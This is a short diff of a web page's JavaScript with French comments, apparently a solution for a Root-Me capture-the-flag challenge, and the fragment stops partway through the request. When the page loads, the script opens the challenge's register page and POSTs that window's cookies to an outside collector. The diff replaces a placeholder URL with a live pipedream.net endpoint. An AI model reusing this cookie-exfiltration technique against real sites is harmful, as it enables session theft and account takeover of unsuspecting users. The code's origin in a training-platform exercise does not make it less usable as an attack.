@@ -10,14 +10,14 @@
     // Fonction qui s'exécute dès que la page est chargée
     window.onload = function() {
       // Ouvrir la fenêtre cible (RootMe dans cet exemple)
-      let targetWindow = window.open('http://challenge01.root-me.org:58003/login');
+      let targetWindow = window.open('http://challenge01.root-me.org:58003/register');
 
       // Attendre 3 secondes pour que la fenêtre se charge et envoyer les cookies à RequestBin
       setTimeout(() => {
         if (targetWindow) {
           try {
             // Récupérer les cookies de la fenêtre parent
-            targetWindow.fetch('https://your-requestbin-url.com', {
+            targetWindow.fetch('https://eoc70j8g4akb683.m.pipedream.net', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
